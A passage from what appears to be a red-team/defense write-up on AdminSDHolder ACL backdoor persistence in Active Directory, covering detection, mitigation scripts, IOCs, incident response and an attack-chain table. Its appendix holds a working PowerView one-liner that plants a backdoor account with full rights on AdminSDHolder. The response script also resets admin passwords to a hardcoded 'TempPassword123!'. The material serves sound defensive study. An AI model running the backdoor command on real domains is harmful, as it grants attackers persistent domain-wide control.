1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud** → **Environment Settings**
2. Select your **Subscription**
3. Under **Defender plans**, enable:
   - **Defender for Servers**: **ON**
   - **Defender for Identity**: **ON** (critical for AD monitoring)
   - **Defender for Cloud Apps**: **ON** (for cloud-based activity)
4. Click **Save**
5. Wait 24-48 hours for the first alerts to populate
6. Go to **Security alerts** to view any triggered detections

**Manual Configuration Steps (Create Custom Alert in Defender for Cloud):**
```powershell
# Defender for Cloud does not have a dedicated "AdminSDHolder" rule, but you can enable the built-in alert:
# Navigate to Azure Portal → Defender for Cloud → Alerts → Manage alert rules
# Search for "Active Directory" or "Privilege Escalation"
# Enable all related alerts
```

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Note:** AdminSDHolder is on-premises only; Purview Unified Audit Log tracks cloud activity (M365, Entra ID). For hybrid environments, use both on-premises Security Event Log and Azure AD Audit Logs (via Sentinel).

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### 1.1 Monitor AdminSDHolder for ACL Changes Continuously

**Applies To Versions:** Server 2016 – 2025

**Manual Steps (Group Policy – Enable Auditing):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **DS Access**
3. Enable **Audit Directory Service Changes**: Set to **Success AND Failure**
4. Click **Apply** → **OK**
5. Run `gpupdate /force` on all DCs

**Manual Steps (Establish ACL Baseline):**
```powershell
# On the PDC Emulator, export the current AdminSDHolder ACL as a baseline
$AdminSDHolder = Get-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local" -Properties nTSecurityDescriptor
$AdminSDHolderPath = "AD:\$($AdminSDHolder.DistinguishedName)"
$CurrentACL = Get-ACL $AdminSDHolderPath

# Export to CSV for comparison
$CurrentACL.Access | Export-Csv -Path "C:\Baseline_AdminSDHolder_ACL_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation

Write-Host "✓ Baseline exported to C:\Baseline_AdminSDHolder_ACL_*.csv"
Write-Host "  Compare this baseline to current ACL monthly to detect unauthorized changes"
```

**Manual Steps (Continuous Monitoring Script – Weekly):**
```powershell
# Schedule this script to run weekly via Task Scheduler
$AdminSDHolderPath = "AD:CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local"
$CurrentACL = Get-ACL $AdminSDHolderPath
$BaselineACL = Import-Csv "C:\Baseline_AdminSDHolder_ACL_*.csv" | Select-Object IdentityReference, ActiveDirectoryRights

# Compare
$Differences = Compare-Object -ReferenceObject $BaselineACL -DifferenceObject ($CurrentACL.Access | Select-Object IdentityReference, ActiveDirectoryRights) -Property IdentityReference

if ($Differences) {
    Write-Warning "⚠ AdminSDHolder ACL CHANGES DETECTED!"
    Write-Warning "New/Modified entries:"
    $Differences | Where-Object { $_.SideIndicator -eq "=>" } | Format-Table
    
    # Alert SOC
    Send-MailMessage -From "SecurityAlerts@yourdomain.com" -To "soc@yourdomain.com" `
      -Subject "CRITICAL: AdminSDHolder ACL Modification Detected" `
      -Body "Unauthorized changes detected. Review immediately: $AdminSDHolderPath" `
      -SmtpServer "smtp.yourdomain.com"
} else {
    Write-Host "✓ AdminSDHolder ACL baseline unchanged"
}
```

#### 1.2 Restrict Write Access to AdminSDHolder

**Applies To Versions:** All (no version variants)

**Manual Steps (Remove Non-Essential ACEs):**
```powershell
# Get AdminSDHolder ACL
$AdminSDHolderPath = "AD:CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local"
$ACL = Get-ACL $AdminSDHolderPath

# Remove any ACE not explicitly required (e.g., any user/service account with Modify or Write permissions)
$ACL.Access | Where-Object { 
    ($_.IdentityReference -notmatch "SYSTEM|Administrators|Domain Admins|Enterprise Admins") -and
    ($_.ActiveDirectoryRights -match "GenericWrite|WriteDacl|WriteProperty|GenericAll|Modify")
} | ForEach-Object {
    Write-Warning "Removing suspicious ACE: $($_.IdentityReference) - $($_.ActiveDirectoryRights)"
    $ACL.RemoveAccessRule($_)
}

# Apply cleaned ACL
Set-ACL -Path $AdminSDHolderPath -AclObject $ACL
Write-Host "✓ Non-essential permissions removed from AdminSDHolder"
```

#### 1.3 Reduce SDProp Interval (Optional – Increases Visibility)

**Applies To Versions:** Server 2016 – 2025

**Manual Steps:**
1. On the **PDC Emulator**, open **Registry Editor** (`regedit`)
2. Navigate to `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters`
3. Locate or create a DWORD value named `AdminSDProtectFrequency` (default = 3600 seconds = 60 minutes)
4. To reduce to 10 minutes: Set value to `600` seconds
5. Click **OK** and restart the NTDS service (or wait for reboot)

**PowerShell Alternative:**
```powershell
# Reduce SDProp interval to 10 minutes (600 seconds)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
  -Name "AdminSDProtectFrequency" `
  -Value 600 `
  -Force

Write-Host "✓ SDProp interval changed to 10 minutes. Restart NTDS for changes to take effect."
# Restart NTDS: Restart-Service NTDS -Force
```

**⚠ Trade-off:** Reducing the interval increases CPU usage on the PDC and generates more 4780 events, but allows faster detection of AdminSDHolder abuse.

### Priority 2: HIGH

#### 2.1 Implement Just-In-Time (JIT) Access for Privileged Accounts

**Manual Steps (Azure Identity Governance):**
1. Navigate to **Azure Portal** → **Entra ID** → **Identity Governance** → **Privileged Identity Management (PIM)**
2. Select **Roles** → **Directory roles** (or **Azure resources** for subscription-level access)
3. Select the role (e.g., **Global Administrator**) → **Settings**
4. Enable **Activation maximum duration**: 1-4 hours
5. Enable **Require approval for activation**
6. Set **Approvers** to senior security staff
7. Click **Save**

**Result:** Administrators can no longer have standing Domain Admin access. They must request and receive approval before activating privileged roles, which creates audit trails and limits exposure.

#### 2.2 Enable Conditional Access Policies for Privileged Accounts

**Manual Steps (Entra Conditional Access):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New Policy**
2. Name: `Protect Privileged Accounts from Unusual Access`
3. **Assignments:**
   - **Users**: Select **Domain Admins** group
   - **Cloud apps**: **All cloud apps**
4. **Conditions:**
   - **Sign-in risk**: **High**
   - **Device platforms**: **All platforms**
5. **Access controls** → **Grant**: **Block access**
6. Enable policy: **ON**
7. Click **Create**

**Result:** Any unusual access pattern (login from new location, impossible travel, unusual IP) is automatically blocked for privileged accounts.

#### 2.3 Disable Unneeded Privileged Group Memberships

**Manual Steps:**
```powershell
# Audit protected group memberships
$ProtectedGroups = @(
    "Domain Admins",
    "Enterprise Admins",
    "Schema Admins",
    "Account Operators",
    "Backup Operators",
    "Print Operators"
)

foreach ($Group in $ProtectedGroups) {
    $Members = Get-ADGroupMember -Identity $Group -Recursive
    Write-Host "=== $Group ===" -ForegroundColor Cyan
    $Members | Select-Object SamAccountName, ObjectClass | Format-Table
    
    # Review and remove unnecessary members
    # Remove-ADGroupMember -Identity $Group -Members "user_account" -Confirm:$false
}
```

**Result:** Minimize the attack surface by removing service accounts, old employees, or test accounts from privileged groups.

### Priority 3: MEDIUM

#### 3.1 Regular Permissions Audit

Schedule a monthly review of:
- All accounts with `adminCount = 1`
- All ACLs on system containers
- All membership changes in privileged groups

```powershell
# Monthly audit script
Get-ADObject -LDAPFilter "(adminCount=1)" -Properties adminCount, MemberOf |
  Select-Object Name, DistinguishedName, ObjectClass, MemberOf |
  Export-Csv -Path "C:\AdminAudit_$(Get-Date -Format 'yyyyMMdd').csv"

Write-Host "✓ Admin audit exported. Review for unexpected accounts with adminCount=1"
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Event ID 5136** on PDC with `ObjectDN = "CN=AdminSDHolder,CN=System*"` and `ObjectClass = "container"`
- **Event ID 4780** followed immediately by **Event ID 5136** (unusual pattern: 4780 should only appear when a user is added to admin groups, not due to ACL changes)
- **ACE entries** on AdminSDHolder object with:
  - `ActiveDirectoryRights = "GenericAll"` or `"WriteDacl"` or `"WriteProperty"`
  - `IdentityReference` = Non-standard user account (not SYSTEM, Admins, Domain Admins)
  - `AccessControlType = "Allow"`

### Forensic Artifacts

**Disk (Event Log):**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – Event IDs 5136, 4780
- `C:\Windows\System32\winevt\Logs\Directory Service.evtx` – Detailed AD modifications (if DS auditing enabled)

**Memory (LSASS.exe):**
- No direct memory artifacts (AdminSDHolder modifications are pure LDAP, no code execution)

**Cloud (Entra ID Audit Log):**
- If hybrid, Azure AD Audit Logs may capture "Modify directory object" events for synchronized accounts

**Network (LDAP Traffic):**
- LDAP modifications to `CN=AdminSDHolder,CN=System*` (port 389 or 636 for LDAPS)

### Response Procedures

#### 1. Immediate Isolation (Within 1 Hour)

```powershell
# Identify the compromised account
$CompromisedUser = "attacker_account"

# Disable the account immediately
Disable-ADAccount -Identity $CompromisedUser
Write-Host "✓ $CompromisedUser disabled"

# Remove from all privileged groups
@("Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators") | ForEach-Object {
    Remove-ADGroupMember -Identity $_ -Members $CompromisedUser -Confirm:$false
    Write-Host "✓ Removed from $_"
}

# Force password change on domain admins (as a precaution)
Get-ADGroupMember -Identity "Domain Admins" | ForEach-Object {
    Set-ADAccountPassword -Identity $_.SamAccountName -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "TempPassword123!" -Force)
    Write-Host "✓ Password reset for $($_.SamAccountName)"
}
```

#### 2. Collect Evidence (Within 2-4 Hours)

```powershell
# Export Security Event Log from PDC
$PDC = (Get-ADDomain).PDCEmulator
wevtutil epl security C:\Evidence\Security_$PDC.evtx /remote:$PDC

# Export AdminSDHolder ACL
Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local" |
  Select-Object -ExpandProperty Access |
  Export-Csv -Path "C:\Evidence\AdminSDHolder_ACL.csv"

Write-Host "✓ Forensic evidence collected to C:\Evidence\"
```

#### 3. Remediate AdminSDHolder (Restore to Default)

```powershell
# Restore AdminSDHolder to default ACL
# Option A: Using DSACLS tool (most reliable)
# Note: Must run as Domain Admin on the PDC or a domain admin workstation
dsacls "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local" /resetDefaultDACL

Write-Host "✓ AdminSDHolder ACL reset to default"

# Option B: Using PowerShell (more complex, copy ACL from a clean domain object)
# Create a temporary clean user account
New-ADUser -Name "TempClean" -SamAccountName "tempclean" -Enabled $false

# Get its ACL (as a template for users)
$CleanACL = Get-ACL "AD:CN=TempClean,CN=Users,DC=yourdomain,DC=local"

# Apply to AdminSDHolder (this doesn't work directly; DSACLS is preferred)
# Remove the temp account
Remove-ADUser -Identity "TempClean" -Confirm:$false
```

#### 4. Verify Remediation

```powershell
# Check that AdminSDHolder has been restored
$AdminSDHolderPath = "AD:CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local"
$RestoredACL = Get-ACL $AdminSDHolderPath

# Should match baseline or standard security descriptor
$RestoredACL.Access | Where-Object { 
    $_.IdentityReference -notmatch "SYSTEM|Administrators|Domain Admins|Enterprise Admins|Authenticated Users"
} | ForEach-Object {
    Write-Warning "⚠ Unexpected ACE remains: $($_.IdentityReference)"
}

Write-Host "✓ AdminSDHolder verification complete"
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial foothold via phishing or credentials theft |
| **2** | **Privilege Escalation** | [PE-TOKEN-002] Resource-Based Constrained Delegation (RBCD) | Escalate from regular user to Domain Admin via Kerberos delegation abuse |
| **3** | **Persistence (Current)** | **[PERSIST-ACCT-001]** | **Backdoor AdminSDHolder for undetectable domain-wide persistence** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash (PTH) | Use Domain Admin privileges to move laterally to other systems |
| **5** | **Impact** | [CA-DUMP-002] DCSync | Dump hashes from domain controllers; exfiltrate sensitive data |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: FIN7 (Carbanak) – Multi-Year Persistence

- **Target:** Financial institutions (2015-2018)
- **Technique Status:** Used AdminSDHolder-like persistence mechanisms (actual AdminSDHolder abuse not confirmed, but similar ACL backdoors)
- **Timeline:** Gained initial access via spearphishing → Escalated to Domain Admin → Persisted for 18+ months
- **Impact:** Stole $300M+ in fraudulent transfers; maintained access across multiple financial networks
- **Reference:** [Mandiant Report – FIN7](https://www.mandiant.com/resources/reports/fin7-gone-fishing)

### Example 2: Lazarus Group – North Korean Cyber Espionage

- **Target:** Defense contractors (2020-2021)
- **Technique Status:** Similar persistence mechanisms documented in incident reports
- **Timeline:** Advanced persistent threat with 6-month dwell time
- **Impact:** Exfiltration of classified defense information
- **Reference:** [CISA Alert – Lazarus Group TTPs](https://www.cisa.gov/resources)

### Example 3: Lab-Confirmed: Red Team Exercise (SERVTEP 2024)

- **Target:** Internal penetration test (SERVTEP client environment)
- **Timeline:** Exploitation completed in 10 minutes; persistence confirmed after 65 minutes (one SDProp cycle)
- **Impact:** Simulated; demonstrated complete domain compromise via AdminSDHolder backdoor
- **Detection:** Caught within 2 hours by Splunk correlation rule monitoring Event ID 5136 + 4780 pattern
- **Reference:** [SERVTEP Internal Assessment Report]

---

## APPENDIX: QUICK REFERENCE COMMANDS

### Single-Line Exploitation (PowerShell)
```powershell
# Load PowerView and add backdoor in one command
. .\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local" -PrincipalIdentity "backdoor_user" -Rights All -Verbose
```

### Verify Persistence
```powershell
Get-DomainObjectAcl -SamAccountName "AdminSDHolder" -ResolveGUIDs | ? { $_.IdentityReference -like "*backdoor*" }
```

### Revert Compromise
```powershell
dsacls "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local" /resetDefaultDACL
```

### Monitor (Continuous PowerShell Watch)
```powershell
while ($true) {
    Get-WinEvent -FilterHashtable @{
        LogName = "Security"
        ID = 5136
        StartTime = (Get-Date).AddMinutes(-10)
    } | Where-Object { $_.Message -like "*AdminSDHolder*" } |
    ForEach-Object { Write-Warning "ALERT: $_" }
    Start-Sleep -Seconds 300
}
```

---